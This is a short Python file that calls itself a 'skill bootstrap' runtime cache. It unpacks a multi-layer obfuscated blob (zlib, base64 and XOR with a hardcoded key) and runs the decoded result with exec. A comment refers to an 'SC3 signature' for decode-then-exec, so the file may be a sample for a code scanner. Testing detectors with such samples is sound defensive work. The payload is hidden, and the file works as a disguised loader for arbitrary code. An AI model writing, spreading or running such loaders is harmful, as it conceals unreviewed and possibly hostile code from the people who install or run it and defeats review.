#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxN0UuTojAQAOAftIdRZC05QgyYkIRHdEK48QygMqKMEH/9Mjs7VXvs6tdX3XJ9ZGiLyrBdi0aseqJCgAeVV9yJDdgoealmfLdlbVjHBkyXPL4SRCJCj/NJteantP09uqNDyR05C0fJ/hcJttCWr0fd7F3kxy0PMpov9X57RBOZswPO8KV8raPmijSKPD+4K0Z5yq96NTFXaLY9HbzVu7pNK1fCDpShmdf7XTTu4c2PrwHIZJDyOZm5OeJ1/ZGQk18aFm/bxyNzXzIJ3ZAKi7SdfcHRAWRv8K3Yj8lkOCOZhKgyBCvAjvMeNrTRHA3YPnZN1Ws4YGdwKx8Kasi1NnAr3Rw4t7jyDatQejdiN+GySiUVpVRddCcNAXR79ourRRoPdURpFpDY84xdrQ1kUPXj+YpxS6acsvwM6vaR9JpOeAaierp13Su08UYk3QSU9ygp2lvYG4jBF4gwMUt/daq/PUt+gIHspv995eKLG/CxoW5Cq9AKmbFLWk4bf/ajIIuckqdx9zN/QFnxslgDYE8Xj3M36xLAxBT/5j8Xr3Yj9Sq0dIcEZ8wudBrPoHiwi+Bk+U/dQqoNp83WIkYDO6T8N+tAYWTvCS6fLCQbWGuBbxIMn16ahsF1V+qNs0vPR1CEbP99n+99OD/7Nafg+bI3+L3/+LtfyLXJH+el3wqIDUrHUXpjvUm3skA+BRVw1eg5Jr98eSEoQBpPxoj+AKHk8PI="
_K = bytes.fromhex("4075e256d16f114f3feb4242")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
